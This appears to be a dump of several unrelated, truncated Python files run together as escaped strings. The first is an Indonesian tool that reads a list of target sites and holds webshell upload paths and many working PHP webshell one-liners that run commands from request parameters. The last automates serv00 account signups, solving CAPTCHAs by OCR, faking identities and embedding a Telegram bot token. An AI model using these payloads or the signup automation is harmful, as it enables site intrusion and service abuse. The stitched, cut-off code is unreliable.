\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591 \r\n\u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591  \u2591\u2592\u2593\u2588\u2588\u2593\u2592\u2591         \u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591  \u2591\u2592\u2593\u2588\u2593\u2592\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591     \u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591 \u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591  \r\n\u2591\u2592\u2593\u2588\u2593\u2592\u2591     \u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2588\u2593\u2592\u2591           \u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591        \u2591\u2592\u2593\u2588\u2593\u2593\u2588\u2593\u2592\u2591 \u2591\u2592\u2593\u2588\u2593\u2592\u2591     \u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591 \r\n\u2591\u2592\u2593\u2588\u2593\u2592\u2591     \u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591             \u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591        \u2591\u2592\u2593\u2588\u2593\u2593\u2588\u2593\u2592\u2591 \u2591\u2592\u2593\u2588\u2593\u2592\u2591     \u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591 \r\n\u2591\u2592\u2593\u2588\u2593\u2592\u2591     \u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591  \u2591\u2592\u2593\u2588\u2588\u2593\u2592\u2591  \u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591 \r\n                                                                                                                                                                         \r\n                                                                                                                                                                         \r\n# -*-coding:Latin-1 -*- \r\n\"\"\")\r\n\r\n# Fungsi untuk login dengan password\r\ndef login():\r\n    print(\"Login required!\")\r\n    password = \"fariz123\"  # Tentukan password yang benar disini\r\n    user_password = input(\"Enter password: \")\r\n    \r\n    if user_password != password:\r\n        print(\"Incorrect password! Exiting program.\")\r\n        exit()\r\n    else:\r\n        # Menampilkan gambar ASCII setelah login berhasil\r\n        print_ghost_rider()\r\n\r\n# Memasukkan proses login\r\nlogin()\r\n\r\n# Mengimpor pustaka yang diperlukan\r\nimport sys\r\nimport requests\r\nimport re\r\nfrom multiprocessing.dummy import Pool\r\nfrom colorama import Fore, init\r\nimport base64\r\n\r\ninit(autoreset=True)\r\n\r\n# Warna untuk output terminal\r\nfr = Fore.RED\r\nfc = Fore.CYAN\r\nfw = Fore.WHITE\r\nfg = Fore.GREEN\r\nfm = Fore.MAGENTA\r\n\r\n# Mematikan peringatan SSL\r\nrequests.packages.urllib3.disable_warnings()\r\n\r\n# Menambahkan header HTTP standar\r\nheaders = {\r\n    'Connection': 'keep-alive',\r\n    'Cache-Control': 'max-age=0',\r\n    'Upgrade-Insecure-Requests': '1',\r\n    'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36',\r\n    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',\r\n    'Accept-Encoding': 'gzip, deflate',\r\n    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',\r\n    'Referer': 'https://www.google.com'\r\n}\r\n\r\n# Memastikan target ada di inputan\r\ntry:\r\n    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]\r\nexcept IndexError:\r\n    path = sys.argv[0].split('\\\\')\r\n    exit(f'\\n  [!] Masukkan file <{path[-1]}> <sites.txt>')\r\n\r\n# Fungsi untuk menghapus bagian http:// atau https:// dari URL\r\ndef URLdomain(site):\r\n    if site.startswith(\"http://\"):\r\n        site = site.replace(\"http://\", \"\")\r\n    elif site.startswith(\"https://\"):\r\n        site = site.replace(\"https://\", \"\")\r\n    \r\n    pattern = re.compile('(.*)/')\r\n    while re.findall(pattern, site):\r\n        site = re.findall(pattern, site)[0]\r\n    return site\r\n\r\n# Fungsi untuk mendeteksi shell PHP dengan pattern yang sudah ditambahkan\r\ndef lolers(url):\r\n    # Daftar path yang digunakan untuk upload shell\r\n    upload_paths = [\r\n        '/upload.php', '/admin/upload.php', '/file_upload.php', '/upload_shell.php', \r\n        '/admin/files/upload.php', '/file_manager/upload.php', '/shell_upload.php', \r\n        '/user/upload.php', '/uploads/', '/wp-content/uploads/', '/wp-admin/images/',\r\n        '/upload/image/lo.php',  # Tambahan sesuai dengan path sebelumnya\r\n        '/upload/images/upload.php',  # Menggunakan path umum lainnya\r\n    ]\r\n\r\n    # Daftar indikasi raw PHP shell\r\n    shell_indicators = [\r\n        '<?php @eval($_POST[\\'cmd\\']); ?>', '<?php $cmd=$_POST[\\'cmd\\']; echo shell_exec($cmd); ?>',\r\n        '<?php echo shell_exec($_GET[\\'cmd\\']); ?>', '<?php system($_POST[\\'cmd\\']); ?>',\r\n        '<?php passthru($_GET[\\'cmd\\']); ?>', '<?php $cmd=$_GET[\\'cmd\\'];echo shell_exec($cmd); ?>',\r\n        '<?php $cmd=$_POST[\\'cmd\\'];echo shell_exec($cmd); ?>', '<?php echo exec($_POST[\\'cmd\\']); ?>',\r\n        '<?php echo shell_exec($_REQUEST[\\'cmd\\']); ?>', '<?php eval(base64_decode($_POST[\\'cmd\\'])); ?>',\r\n        '<?php file_put_contents(\\'shell.php\\', \"<?php @eval($_POST[\\'cmd\\']); ?>\"); ?>',\r\n        '<?php if(isset($_POST[\\'cmd\\'])) { echo shell_exe",
    "from flask import Flask, render_template, request, jsonify, send_file\nimport pyodbc\nimport json\nimport os\n\napp = Flask(__name__)\n\n# Home route\n@app.route('/')\ndef index():\n    return render_template('index.html')\n\n# Route to handle schema generation for SQL Server\n@app.route('/generate-schema', methods=['POST'])\ndef generate_schema():\n    data = request.json\n    db_type = data.get(\"db_type\")  # SQL Server\n    host = data.get(\"host\")\n    database = data.get(\"database\")\n    username = data.get(\"username\")\n    password = data.get(\"password\")\n\n    if not all([host, database, username, password, db_type]):\n        return jsonify({\"success\": False, \"error\": \"All fields are required\"}), 400\n\n    if db_type != 'sqlserver':\n        return jsonify({\"success\": False, \"error\": \"Unsupported database type, only SQL Server is supported\"}), 400\n\n    try:\n        # Connect to SQL Server\n        conn = pyodbc.connect(\n            f\"DRIVER={{ODBC Driver 17 for SQL Server}};SERVER={host};DATABASE={database};UID={username};PWD={password}\"\n        )\n\n        # Extract schema information\n        cursor = conn.cursor()\n        tables = {}\n\n        # Get table columns for SQL Server\n        cursor.execute(\"\"\" \n            SELECT TABLE_NAME, COLUMN_NAME, DATA_TYPE \n            FROM INFORMATION_SCHEMA.COLUMNS \n        \"\"\")\n\n        for row in cursor.fetchall():\n            table_name = row[0]\n            column_name = row[1]\n            data_type = row[2]\n\n            if table_name not in tables:\n                tables[table_name] = {\"columns\": [], \"primary_keys\": [], \"foreign_keys\": []}\n\n            tables[table_name][\"columns\"].append(f\"{column_name} ({data_type})\")\n\n        # Fetch primary keys for SQL Server\n        cursor.execute(\"\"\" \n            SELECT \n                kcu.TABLE_NAME, kcu.COLUMN_NAME, c.DATA_TYPE \n            FROM INFORMATION_SCHEMA.KEY_COLUMN_USAGE kcu \n            JOIN INFORMATION_SCHEMA.COLUMNS c \n                ON kcu.TABLE_NAME = c.TABLE_NAME AND kcu.COLUMN_NAME = c.COLUMN_NAME \n            WHERE OBJECTPROPERTY(OBJECT_ID(kcu.CONSTRAINT_NAME), 'IsPrimaryKey') = 1\n        \"\"\")\n\n        for row in cursor.fetchall():\n            table_name = row[0]\n            column_name = row[1]\n            data_type = row[2]\n\n            if table_name in tables:\n                tables[table_name][\"primary_keys\"].append(f\"{column_name} ({data_type})\")\n\n        # Fetch foreign keys for SQL Server\n        cursor.execute(\"\"\" \n            SELECT \n                fk.TABLE_NAME, cu.COLUMN_NAME, pk.TABLE_NAME AS REFERENCED_TABLE_NAME, \n                pt.COLUMN_NAME AS REFERENCED_COLUMN_NAME, c.DATA_TYPE \n            FROM INFORMATION_SCHEMA.REFERENTIAL_CONSTRAINTS rc \n            JOIN INFORMATION_SCHEMA.TABLE_CONSTRAINTS fk \n                ON rc.CONSTRAINT_NAME = fk.CONSTRAINT_NAME \n            JOIN INFORMATION_SCHEMA.TABLE_CONSTRAINTS pk \n                ON rc.UNIQUE_CONSTRAINT_NAME = pk.CONSTRAINT_NAME \n            JOIN INFORMATION_SCHEMA.KEY_COLUMN_USAGE cu \n                ON fk.CONSTRAINT_NAME = cu.CONSTRAINT_NAME \n            JOIN INFORMATION_SCHEMA.KEY_COLUMN_USAGE pt \n                ON pk.CONSTRAINT_NAME = pt.CONSTRAINT_NAME \n            JOIN INFORMATION_SCHEMA.COLUMNS c \n                ON fk.TABLE_NAME = c.TABLE_NAME AND cu.COLUMN_NAME = c.COLUMN_NAME \n        \"\"\")\n\n        for row in cursor.fetchall():\n            table_name = row.TABLE_NAME\n            column_name = row.COLUMN_NAME\n            referenced_table = row.REFERENCED_TABLE_NAME\n            referenced_column = row.REFERENCED_COLUMN_NAME\n            data_type = row.DATA_TYPE\n\n            if table_name in tables:\n                tables[table_name][\"foreign_keys\"].append({\n                    \"column\": f\"{column_name} ({data_type})\",\n                    \"references\": {\n                        \"table\": referenced_table,\n                        \"column\": referenced_column\n                    }\n                })\n\n        # Save schema to JSON file\n        schema_file = 'database_schema.json'\n        with open(schema_file, 'w') as f:\n            json.dump(tables, f, indent=4)\n\n        conn.close()\n        return jsonify({\"success\": True, \"file_url\": '/download-schema'})\n\n    except Exception as e:\n        return jsonify({\"success\": False, \"error\": str(e)}), 500\n\n# Route for downloading the generated schema\n@app.route('/download-schema', methods=['GET'])\ndef download_schema():\n    file_path = 'database_schema.json'\n    if os.path.exists(file_path):\n        return send_file(file_path, as_attachment=True)\n    return jsonify({\"success\": False, \"error\": \"File not found\"}), 404\n\nif __name__ == '__main__':\n    app.run(debug=True,port=5001)\n",
    "from __future__ import annotations\n\nimport subprocess\nimport os\nimport pwd\nfrom abc import ABC, abstractmethod\nfrom typing import Callable\nfrom io import IOBase\n\nfrom lib import State, Try, Invert\n\n\n\nclass Runnable(ABC):\n    @abstractmethod\n    def run(self) -> any:\n        \"\"\"\n        Runs the Programm and returns something.\n        \"\"\"\n        pass\n\nclass AnsiColor:\n    \"\"\" ANSI color codes \"\"\"\n    BLACK = \"\\033[0;30m\"\n    RED = \"\\033[0;31m\"\n    GREEN = \"\\033[0;32m\"\n    BROWN = \"\\033[0;33m\"\n    BLUE = \"\\033[0;34m\"\n    PURPLE = \"\\033[0;35m\"\n    CYAN = \"\\033[0;36m\"\n    LIGHT_GRAY = \"\\033[0;37m\"\n    DARK_GRAY = \"\\033[1;30m\"\n    LIGHT_RED = \"\\033[1;31m\"\n    LIGHT_GREEN = \"\\033[1;32m\"\n    YELLOW = \"\\033[1;33m\"\n    LIGHT_BLUE = \"\\033[1;34m\"\n    LIGHT_PURPLE = \"\\033[1;35m\"\n    LIGHT_CYAN = \"\\033[1;36m\"\n    LIGHT_WHITE = \"\\033[1;37m\"\n    BOLD = \"\\033[1m\"\n    FAINT = \"\\033[2m\"\n    ITALIC = \"\\033[3m\"\n    UNDERLINE = \"\\033[4m\"\n    BLINK = \"\\033[5m\"\n    NEGATIVE = \"\\033[7m\"\n    CROSSED = \"\\033[9m\"\n    END = \"\\033[0m\"\n\n\nclass Shell(Runnable):\n    \"\"\"\n    Can build and run shell commands.\n    \"\"\"\n    def __init__(self, cmd: str):\n        self.cmd = cmd\n\n    def __repr__(self) -> str:\n        return f\"<Shell '{self.cmd:5}'>\"\n\n    def pipe(self, cmd: str) -> Shell:\n        self.cmd += f\" | {cmd}\"\n        return self\n\n    def stdout(self, target: str) -> Shell:\n        cmd = self.cmd + f\" 1>{target}\"\n        return self\n\n    def stderr(self, target: str) -> Shell:\n        cmd = self.cmd + f\" 2>{target}\"\n        return self\n\n    def _get_process_owner_username(self) -> str:\n        owner = os.getuid()\n        pw_entry = pwd.getpwuid(owner)\n        return pw_entry.pw_name\n\n    def run(self, user: str = None, cwd: str = None, sudo: bool = False) -> subprocess.CompletedProcess:\n        cmd = \"sudo \" + self.cmd if sudo else self.cmd\n        cmd = os.path.expandvars(cmd.replace('~', '$HOME'))\n\n        user = user if user else self._get_process_owner_username()\n\n        cwd = cwd if cwd else os.getcwd()\n\n        print(f\"{AnsiColor.GREEN}{user}{AnsiColor.END}@{AnsiColor.LIGHT_CYAN}{cwd}{AnsiColor.END} {cmd}\")\n        return subprocess.run(\n                cmd,\n                capture_output=True, \n                cwd=cwd, \n                user=user, \n                shell=True,\n            )\n\n\n\nclass Command(State):\n    \"\"\"\n    State that reaches his target State by running different Shell runnables.\n    \"\"\"\n\n    def __init__(self, install: Shell, uninstall: Shell, detect: Shell):\n        \"\"\"\n        install: Shell script to install target\n        uninstall: Shell script to uninstall target\n        detect: Shell script to detect if target is installed. Must return code 0 if installed or > 0 if not installed.\n        \"\"\"\n        self._install = install\n        self._uninstall = uninstall\n        self._detect = detect\n\n    def install(self):\n        r = self._install.run()\n        assert r.returncode == 0, f\"install failed: Shell exit code {r.returncode}\\n{r.stderr.decode()}\"\n\n    def uninstall(self):\n        r = self._uninstall.run()\n        assert r.returncode == 0, f\"uninstall failed: Shell exit code {r.returncode}\\n{r.stderr.decode()}\"\n\n    def detect(self):\n        r = self._detect.run()\n        return r.returncode == 0\n\n\n# packet managers\n\nclass Dpkg(State):\n    def __init__(self, package: str, archive: str):\n        \"\"\"\n        package: package name of the installed archive (for an archive 'dpkg --info *.db').\n        archive: debian archive file (usually matched by *.deb)\n        \"\"\"\n        self.package = package\n        self.archive = archive\n\n    def install(self):\n        assert os.path.isfile(self.archive), f\"archive must be a file, got '{self.archive}'.\"\n        r = Shell(f\"dpkg --install '{self.archive}'\").run(sudo=True)\n        assert r.returncode == 0, f\"failed to install '{self.archive}'. \\nstderr: {r.stderr.decode()}\"\n\n    def uninstall(self):\n        r = Shell(f\"dpkg --remove '{self.package}'\").run(sudo=True)\n        assert r.returncode == 0, f\"failed to uninstall '{self.archive}'. \\nstderr: {r.stderr.decode()}\"\n\n    def detect(self):\n        r = Shell(f\"dpkg --status '{self.package}'\").run()\n        return r.returncode == 0\n\n\nclass Apt(State):\n    def __init__(self, package: str):\n        \"\"\"\n        package: apt package name\n        \"\"\"\n        self.package = package\n\n    def install(self):\n        r = Shell(f\"apt install '{self.package}'\").run(sudo=True)\n        if r.returncode == 0:\n            return\n        raise Exception(f\"failed to install '{self.package}'. \\nstderr: {r.stderr.decode()}\")\n\n    def uninstall(self):\n        r = Shell(f\"apt remove '{self.package}'\").run(sudo=True)\n        if r.returncode == 0:\n            return\n        raise Exception(f\"failed to uninstall '{self.package}'. \\nstderr: {r.stderr.decode()}\")\n\n    def detect(self) -> bool:\n        r = Shell(f\"dpkg --status '{self.package}'\").run()\n        return r.returncode == 0\n\n\nclass Snap(State):\n    def __init__(self, package: str, class",
    "import hashlib\r\nimport os\r\n\r\nimport stripe\r\nimport requests\r\nfrom fastapi import FastAPI, Request, HTTPException\r\nfrom sqlmodel import SQLModel, Session, create_engine, select\r\nfrom starlette.responses import RedirectResponse\r\nfrom models import Order\r\nfrom dotenv import load_dotenv\r\n\r\nload_dotenv()\r\n\r\nPID = os.getenv(\"PID\")\r\nKEY = os.getenv(\"KEY\")\r\nSIGN_TYPE = os.getenv(\"SIGN_TYPE\")\r\nCURRENCY = os.getenv(\"CURRENCY\")\r\nSTRIPE_WEBHOOK_SECRET = os.getenv(\"STRIPE_WEBHOOK_SECRET\")\r\n\r\n\r\nDATABASE_URL = \"sqlite:///./test.db\"\r\n\r\nPAYMENT_METHODS = {\r\n    \"wxpay\":\"wechat_pay\",\r\n    \"alipay\":\"alipay\",\r\n    \"qqpay\":\"card\",\r\n}\r\n\r\n\r\n\r\napp = FastAPI()\r\nstripe.api_key = KEY\r\nengine = create_engine(DATABASE_URL, echo=False)\r\n\r\n\r\n@app.on_event(\"startup\")\r\ndef on_startup():\r\n    # \u521b\u5efa\u6570\u636e\u5e93\u8868\r\n    SQLModel.metadata.create_all(engine)\r\n\r\n\r\ndef epay_sign(params: dict, key: str) -> str:\r\n    \"\"\"\r\n    \u6839\u636e\u7ed9\u5b9a\u7684\u53c2\u6570\u5b57\u5178\u548c\u5546\u6237\u5bc6\u94a5 key\uff0c\u751f\u6210\u6613\u652f\u4ed8\u7b7e\u540d\uff08MD5 \u5c0f\u5199\uff09\u3002\r\n    1. \u5c06\u6240\u6709\u53c2\u6570\u6839\u636e\u53c2\u6570\u540d ASCII \u5347\u5e8f\u6392\u5e8f\uff08sign\u3001sign_type\u3001\u7a7a\u503c \u4e0d\u53c2\u4e0e\u7b7e\u540d\uff09\u3002\r\n    2. \u5c06\u6392\u5e8f\u540e\u7684\u53c2\u6570\u62fc\u63a5\u6210 a=b&c=d&... \u683c\u5f0f\uff08\u503c\u4e0d\u505aURL\u7f16\u7801\uff09\u3002\r\n    3. \u5728\u672b\u5c3e\u62fc\u63a5\u4e0a KEY\uff0c\u6267\u884c MD5 \u5e76\u8fd4\u56de\u7ed3\u679c\u7684\u5c0f\u5199\u5f62\u5f0f\u3002\r\n\r\n    :param params: \u8ba2\u5355\u53c2\u6570\u5b57\u5178\r\n    :param key: \u6613\u652f\u4ed8\u5546\u6237\u5bc6\u94a5\r\n    :return: MD5\u7b7e\u540d\u5b57\u7b26\u4e32\uff08\u5c0f\u5199\uff09\r\n    \"\"\"\r\n\r\n    # 1. \u8fc7\u6ee4\u6389 sign / sign_type / \u4ee5\u53ca\u503c\u4e3a\u7a7a\u7684\u53c2\u6570\r\n    filtered_params = {\r\n        k: v for k, v in params.items()\r\n        if k not in [\"sign\", \"sign_type\"] and v not in [None, \"\"]\r\n    }\r\n\r\n    # 2. \u6309\u7167\u53c2\u6570\u540dASCII\u7801\u5347\u5e8f\u6392\u5e8f\r\n    sorted_keys = sorted(filtered_params.keys())\r\n\r\n    # 3. \u62fc\u63a5\u6210 \"a=b&c=d&...\" \u5f62\u5f0f\r\n    sign_str = \"&\".join(f\"{k}={filtered_params[k]}\" for k in sorted_keys)\r\n\r\n    # 4. \u672b\u5c3e\u62fc\u63a5\u4e0a key\r\n    sign_str_with_key = f\"{sign_str}{key}\"\r\n\r\n    # 5. \u505aMD5\u54c8\u5e0c\u5e76\u8f6c\u6210\u5c0f\u5199\r\n    md5_obj = hashlib.md5(sign_str_with_key.encode(\"utf-8\"))\r\n    sign_result = md5_obj.hexdigest().lower()\r\n\r\n    return sign_result\r\n\r\n\r\ndef get_real_time_rates() -> dict:\r\n    url = \"https://api.exchangerate-api.com/v4/latest/CNY\"\r\n    response = requests.get(url, timeout=10)\r\n    data = response.json()\r\n    return data[\"rates\"]\r\n\r\n\r\ndef convert_cny_dynamic(amount: float, target_currency: str) -> float:\r\n    rates = get_real_time_rates()\r\n    rate = rates.get(target_currency.upper())\r\n    if rate is None:\r\n        raise ValueError(f\"\u6682\u4e0d\u652f\u6301\u7684\u76ee\u6807\u5e01\u79cd: {target_currency}\")\r\n\r\n    return amount * rate\r\n\r\n@app.post(\"/submit.php\")\r\nasync def epay_submit(request: Request):\r\n    form = await request.form()\r\n\r\n    pid = form.get(\"pid\")\r\n    out_trade_no = form.get(\"out_trade_no\")\r\n    money = form.get(\"money\")\r\n    pay_type = form.get(\"type\")\r\n    name = form.get(\"name\")\r\n    notify_url = form.get(\"notify_url\")\r\n    return_url = form.get(\"return_url\")\r\n    site_name = form.get(\"sitename\")\r\n    sign = form.get(\"sign\")\r\n    sign_type = form.get(\"sign_type\")\r\n\r\n    if pid != PID:\r\n        raise HTTPException(status_code=400, detail=\"PID error\")\r\n    if not all([pid, out_trade_no, money, pay_type, name, notify_url, return_url,site_name, sign]):\r\n        raise HTTPException(status_code=400, detail=\"Missing required parameters\")\r\n\r\n    params_for_sign = dict(form)\r\n    if sign_type == \"MD5\":\r\n        server_sign = epay_sign(params_for_sign, KEY)\r\n        if sign.lower() != server_sign.lower():\r\n            raise HTTPException(status_code=400, detail=\"Sign error\")\r\n    else:\r\n        raise HTTPException(status_code=400, detail=\"Unsupported sign_type\")\r\n\r\n    with Session(engine) as db_sess:\r\n        try:\r\n            money_float = float(money)\r\n        except:\r\n            raise HTTPException(status_code=400, detail=\"Money format error\")\r\n\r\n        db_order = Order(\r\n            pid=PID,\r\n            out_trade_no=out_trade_no,\r\n            money=money_float,\r\n            name=name,\r\n            pay_type=pay_type,\r\n            notify_url=notify_url,\r\n            return_url=return_url,\r\n            status=\"INIT\"\r\n        )\r\n        db_sess.add(db_order)\r\n        db_sess.commit()\r\n        db_sess.refresh(db_order)\r\n\r\n    try:\r\n        checkout_session = stripe.checkout.Session.create(\r\n            payment_method_types=[PAYMENT_METHODS[pay_type]],\r\n            payment_method_options={\r\n                \"wechat_pay\": {\r\n                    \"client\": \"web\"\r\n                }\r\n            },\r\n            line_items=[{\r\n                \"price_data\": {\r\n                    \"currency\": CURRENCY,\r\n                    \"unit_amount\": int(convert_cny_dynamic(money_float,CURRENCY) * 100),\r\n                    \"product_data\": {\r\n                        \"name\": name\r\n                    },\r\n                },\r\n                \"quantity\": 1,\r\n            }],\r\n            mode=\"payment\",\r\n            success_url=return_url,\r\n            cancel_url=return_url,\r\n        )\r\n    except Exception as e:\r\n        print(e)\r\n        raise HTTPException(status_code=500, detail=str(e))\r\n\r\n    with Session(engine) as db_sess:\r\n        db_order = db_sess.exec(\r\n            select(Order).where(Order.out_trade_no == out_trade_no)\r\n        ).first()\r\n        if db_order:\r\n            db_order.stripe_session_id = checkout_session.id\r\n            db_sess.add(db_order)\r\n            db",
    "import os\nimport re\nimport json\nimport time\nimport string\nimport random\nimport ddddocr\nimport inspect\nimport asyncio\nimport requests\nfrom telegram import Bot\nfrom loguru import logger\nfrom datetime import datetime\nfrom urllib.parse import quote\nfrom requests.exceptions import JSONDecodeError\nos.makedirs(\"static\", exist_ok=True)\ncache = {}\nglobal input_token, input_chatid\nconfig_file = 'static/config.json'\ndef get_input_prompt():\n    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S.') + str(datetime.now().microsecond // 1000).zfill(3)\n    frame = inspect.stack()[1]\n    module_name = inspect.getmodule(frame[0]).__name__\n    module_info = f'{module_name}:<module>'\n    caller_line = frame.lineno\n    return f'\\033[32m{current_time}\\033[0m | \\033[1;94mINPUT\\033[0m    | \\033[36m{module_info}:{caller_line}\\033[0m - '\nasync def send_message(message):\n    global input_token, input_chatid\n    bot = Bot(token=input_token)\n    try:\n        await bot.send_message(chat_id=input_chatid, text=message)\n    except Exception as e:\n        logger.error(f\"\u53d1\u9001\u5931\u8d25: {e}\")\ndef get_user_name():\n    url = \"https://www.ivtool.com/random-name-generater/uinames/api/index.php?region=united%20states&gender=male&amount=5&=\"\n    resp = requests.get(url, verify=False)\n    if resp.status_code != 200:\n        print(resp.status_code, resp.text)\n        raise Exception(\"\u83b7\u53d6\u540d\u5b57\u51fa\u9519\")\n    data = resp.json()\n    return data\ndef generate_random_username():\n    length = random.randint(7, 10)\n    characters = string.ascii_letters\n    random_string = ''.join(random.choice(characters) for _ in range(length))\n    return random_string\ndef start_userconfig():\n    if os.path.exists(config_file):\n        try:\n            with open(config_file, 'r') as f:\n                config = json.load(f)\n                if config: return config['token'], config['chatid']\n        except (json.JSONDecodeError, IOError):\n            pass\n        input_token = input(f\"{get_input_prompt()}\\033[1;94m\u8bf7\u8f93\u5165Telegram Bot Token [\u9ed8\u8ba4\u4f7f\u7528 @Serv00Reg_Bot]:\\033[0m\")\n        if input_token == \"\": input_token = '7594103635:AAEoQKB_ApJgDbfoVJm-gwW6e0VVS_a5Dl4'\n        input_chatid = get_valid_input(\"\\033[1;94m\u8bf7\u8f93\u5165Telegram Chat ID:\\033[0m\", lambda x: x.isdigit() and int(x) > 0, \"\u65e0\u6548\u7684ChatID,\u8bf7\u8f93\u5165\u4e00\u4e2a\u6b63\u6574\u6570.\")\n    with open(config_file, 'w') as f:\n        json.dump({'token': input_token.strip(), 'chatid': input_chatid.strip()}, f)\n    return input_token, input_chatid\ndef get_valid_input(prompt, validation_func, error_msg):\n    while True:\n        user_input = input(f\"{get_input_prompt()}{prompt}\")\n        if validation_func(user_input):\n            return user_input\n        logger.error(f\"\\033[1;93m{error_msg}\\033[0m\")\ndef start_task(input_email: str):\n    id_retry = 1\n    while True:\n        try:\n            User_Agent = ''.join(random.choices(string.digits, k=24))\n            Cookie = \"csrftoken={}\"\n            url1 = \"https://www.serv00.com/offer/create_new_account\"\n            headers = {f\"User-Agent\": User_Agent}\n            captcha_url = \"https://www.serv00.com/captcha/image/{}/\"\n            header2 = {\"Cookie\": Cookie, \"User-Agent\": User_Agent}\n            url3 = \"https://www.serv00.com/offer/create_new_account.json\"\n            header3 = {\n                \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\",\n                \"Referer\": \"https://www.serv00.com/offer/create_new_account\",\n                \"Cookie\": Cookie,\n                \"User-Agent\": User_Agent\n            }\n            email = input_email\n            usernames = get_user_name()\n            _ = usernames.pop()\n            first_name = _[\"name\"]\n            last_name = _[\"surname\"]\n            username = generate_random_username().lower()\n            print(\"\"), logger.info(f\"{email} {first_name} {last_name} {username}\")\n            with requests.Session() as session:\n                logger.info(f\"\u83b7\u53d6\u7f51\u9875\u4fe1\u606f - \u5c1d\u8bd5\u6b21\u6570: \\033[1;94m{id_retry}\\033[0m.\")\n                resp = session.get(url=url1, headers=headers, verify=False)\n                headers = resp.headers\n                content = resp.text\n                csrftoken = re.findall(r\"csrftoken=(\\w+);\", headers.get(\"set-cookie\"))[0]\n                header2[\"Cookie\"] = header2[\"Cookie\"].format(csrftoken)\n                header3[\"Cookie\"] = header3[\"Cookie\"].format(csrftoken)\n                captcha_0 = re.findall(r'id=\\\"id_captcha_0\\\" name=\\\"captcha_0\\\" value=\\\"(\\w+)\\\">', content)[0]\n                captcha_retry = 1\n                while True:\n                    time.sleep(random.uniform(0.5, 1.2))\n                    logger.info(\"\u83b7\u53d6\u9a8c\u8bc1\u7801\")\n                    resp = session.get(url=captcha_url.format(captcha_0), headers=dict(header2, **{\"Cookie\": header2[\"Cookie\"].format(csrftoken)}), verify=False)\n                    content = resp.content\n                    with open(\"static/image.jpg\", \"wb\") as f:\n                        f.write(content)\n                    captcha_1 = ddddocr.DdddOcr(show_ad=False).classification(content).upper()\n                    if bool(re.match(r'",
